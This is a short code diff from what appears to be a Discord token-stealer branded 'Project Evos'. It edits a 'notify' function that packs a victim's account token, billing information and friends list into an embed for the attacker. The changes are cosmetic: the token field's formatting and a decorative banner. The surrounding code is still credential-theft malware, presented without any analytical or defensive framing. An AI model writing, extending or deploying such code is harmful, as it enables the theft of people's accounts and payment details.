@@ -257,7 +257,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.unshift({
         name: `Token:`,
-        value: `\`\`\`${token}\n${arrow}\`\`\``,
+        value: `\`\`\`${token}\`\`\``,
         inline: false
     })
 
@@ -274,7 +274,11 @@ const notify = async (ctx, token, user) => {
         { name: "Billing", value: `${billing}`, inline: true },
         // { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
-
+    ctx.embeds[0].fields.push({
+        name: "\u200b", // To create an empty field for spacing
+        value: `\`\`\`\n⊱≼≽⊰⊹═════⊹⊱≼Project Evos≽⊰⊹═════⊹⊱\n\`\`\``,
+        inline: false
+    });
     if (friends) {
         ctx.embeds.push({ title: friends.title, description: friends.description });
     }
